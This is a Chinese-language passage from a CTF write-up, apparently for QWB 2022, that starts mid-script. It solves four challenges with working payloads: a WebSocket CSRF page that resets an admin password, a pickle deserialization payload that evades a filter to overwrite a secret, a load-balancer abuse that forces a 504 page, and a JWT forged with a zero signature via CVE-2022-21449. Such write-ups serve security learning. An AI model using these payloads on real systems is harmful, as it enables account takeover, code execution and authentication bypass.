&#x27;)[:-1].decode()) bx = (rx-cx)//ax print(rx,ax,bx) io.sendafter(&#x27;&gt; b(x) = &#x27;,str(bx))io.recvall() Webbabyweb随手注册一个账号登录后，根据提示发送 help ，返回如下信息 一开始看到 bugreport 命令（发送 bugreport 网址 管理员会去请求你发送的网址），觉得应该是 XSS 钓管理员的 cookie，但是一直没成功，接收不到请求。 后来考虑到利用 bugreport 和 changepw 功能构造 csrf 修改管理员密码 ，根据页面中的 js ，简单构造 ws 的请求，上传到自己的服务器， 试了半天还是不行，最后考虑到不出网，题目描述里给了 docker 容器映射的端口，所以脚本里的 ws 地址改为 ws://127.0.0.1:8888 1docker run -dit -p &quot;0.0.0.0:pub_port:8888&quot; babyweb 1234567891011&lt;meta charset=&quot;utf‐8&quot; /&gt;&lt;script&gt;var ws = null;var url = &quot;ws://127.0.0.1:8888/bot&quot;;ws = new WebSocket(url);ws.onopen = function (event) &#123; var msg = &quot;changepw 123456&quot;; ws.send(msg);&#125;&lt;/script&gt; 在对话框里发送 bugreport poc地址 ，然后 admin的密码就会被重置为 123456，重新登录 admin 账户 购买 Hint 得到题目源码 /static/qwb_source_12580.zip 查看源码发现限制的很死，必须在定义的范围内、必须是数字之类的，最后考虑到 python 和 go 俩语言不同，json 解释器也不同，绕过了限制，参考文章 深入考察JSON在互操作性方面的安全漏洞 返回页面得到flag crash 题目内容：flag in 504 page 访问首页得到题目源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import base64# import sqlite3import picklefrom flask import Flask, make_response,request, sessionimport adminimport randomapp = Flask(__name__,static_url_path=&#x27;&#x27;)app.secret_key=random.randbytes(12)class User: def __init__(self, username,password): self.username=username self.token=hash(password)def get_password(username): if username==&quot;admin&quot;: return admin.secret else: # conn=sqlite3.connect(&quot;user.db&quot;) # cursor=conn.cursor() # cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;) # data=cursor.fetchall()[0] # if data: # return data[0] # else: # return None return session.get(&quot;password&quot;)@app.route(&#x27;/balancer&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def flag(): pickle_data=base64.b64decode(request.cookies.get(&quot;userdata&quot;)) if b&#x27;R&#x27; in pickle_data or b&quot;secret&quot; in pickle_data: return &quot;You damm hacker!&quot; os.system(&quot;rm -rf *py*&quot;) userdata=pickle.loads(pickle_data) if userdata.token!=hash(get_password(userdata.username)): return &quot;Login First&quot; if userdata.username==&#x27;admin&#x27;: return &quot;Welcome admin, here is your next challenge!&quot; return &quot;You&#x27;re not admin!&quot;@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): resp = make_response(&quot;success&quot;) session[&quot;password&quot;]=request.values.get(&quot;password&quot;) resp.set_cookie(&quot;userdata&quot;, base64.b64encode(pickle.dumps(User(request.values.get(&quot;username&quot;),request.values.get(&quot;password&quot;)),2)), max_age=3600) return resp@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): return open(&#x27;source.txt&#x27;,&quot;r&quot;).read()if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 登陆 admin ，用户名和密码通过 GET 传参。经过序列化操作和 base64 编码后放到 cookie 里 12345def login(): resp = make_response(&quot;success&quot;) session[&quot;password&quot;]=request.values.get(&quot;password&quot;) resp.set_cookie(&quot;userdata&quot;, base64.b64encode(pickle.dumps(User(request.values.get(&quot;username&quot;),request.values.get(&quot;password&quot;)),2)), max_age=3600) return resp 我们发现 admin 的密码是本地变量 secret ，但是不知道 secret 的值是多少 123def get_password(username): if username==&quot;admin&quot;: return admin.secret 我们可以通过 pickle 反序列化实现 变量覆盖 ，注意传入的序列化字符串中不能出现 R 和 secret 12if b&#x27;R&#x27; in pickle_data or b&quot;secret&quot; in pickle_data: return &quot;You damm hacker!&quot; 我们使用双层 exec 绕过，另外推荐一篇 pickle反序列化初探 文章，写的很详细 123456789import base64data = b&#x27;&#x27;&#x27;(S&#x27;exec(&#x27;admin.se&#x27;+&#x27;cret=&quot;admin&quot;&#x27;)&#x27;i__builtin__exec.&#x27;&#x27;&#x27;print(base64.b64encode(data))# KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg== 此时页面显示成功 1http://39.107.237.149:25512/login?username=admin&amp;password=admin 此时访问 /balancer 会提示 You&#39;re not admin!，我们修改一下 cookie再去请求/balancer 1userdata=KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg== 请求后页面提示 500 ，重新请求一次即可返回正常页面。 这里又提示 flag in 504 page ，所以说这个页面应该是最终得到能flag页面 然后还给了一个 /826fd2f86129b050875e4a70cb059908a7ed 我们直接构造请求一下 访问后得到一个 nginx 配置文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# nginx.vh.default.conf -- docker-openresty## This file is installed to:# `/etc/nginx/conf.d/default.conf`## It tracks the `server` section of the upstream OpenResty&#x27;s `nginx.conf`.## This config (and any other configs in `etc/nginx/conf.d/`) is loaded by# default by the `include` directive in `/usr/local/openresty/nginx/conf/nginx.conf`.## See https://github.com/openresty/docker-openresty/blob/master/README.md#nginx-config-files#lua_package_path &quot;/lua-resty-balancer/lib/?.lua;;&quot;;lua_package_cpath &quot;/lua-resty-balancer/?.so;;&quot;;server &#123; listen 8088; server_name localhost; #charset koi8-r; #access_log /var/log/nginx/host.access.log main; location /gettestresult &#123; default_type text/html; content_by_lua &#x27; local resty_roundrobin = require &quot;resty.roundrobin&quot; local server_list = &#123; [ngx.var.arg_server1] = ngx.var.arg_weight1, [ngx.var.arg_server2] = ngx.var.arg_weight2, [ngx.var.arg_server3] = ngx.var.arg_weight3, &#125; local rr_up = resty_roundrobin:new(server_list) for i = 0,9 do ngx.say(&quot;Server seleted for request &quot;,i,&quot;: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot; ,rr_up:find(),&quot;&lt;br&gt;&quot;) end &#x27;; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \.php$ &#123; # root /usr/local/openresty/nginx/html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache&#x27;s document root # concurs with nginx&#x27;s one # #location ~ /\.ht &#123; # deny all; #&#125;&#125; 文件总共都提到了仨地址，直接都填上，然后 权重 的话，根据多年建站经验来说，数值越低，优先级越高，我们直接都设置为 0 ,或者相同数，然后让这仨冲突去吧。 123127.0.0.1127.0.0.1:8088127.0.0.1:900 静待十几秒，页面返回了 flag ，同时控制台里可以看到请求的接口 504 超时了 CryptomyJWTnc 连接后输入用户名，然后输入 1 获得 generate token，返回一段 JWT，然后输入 2 去 getflag 提示输入 your token 后返回 You are not the administrator.，我们直接解密 JWT 看看 1eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==.5IQnppqB0_rC4OOaCowkLXVYW6eJ1kI6P-IR3dXll0gDYFjQKyOrHbVp10Hrm3GFh8eRBVZok9_z1rrKUQcJUBqQs-PeZElzqrZwE4rPVxJr2fngi2u97HdG4ItmvWiS 很明显看到一个权限校验字段 &quot;admin&quot;: false, 我们先 base64 解码后把 false 改为 true，重新编码为 base64 1234eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==&#123;&quot;iss&quot;:&quot;qwb&quot;,&quot;name&quot;:&quot;iami233&quot;,&quot;admin&quot;:false,&quot;exp&quot;:1659338121700&#125;&#123;&quot;iss&quot;:&quot;qwb&quot;,&quot;name&quot;:&quot;iami233&quot;,&quot;admin&quot;:true,&quot;exp&quot;:1659338121700&#125;eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9 CVE-2022-21449：传入sig值对(r, s)为(0, 0)时，可以绕过验证 最后一段数据我们用 0 填充，原数据是 128 位，我们也用128 个 A 填充 1eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 注意 token 失效时间有点快，所以整体做的时候速度快一点，当然也可以用脚本实现自动化

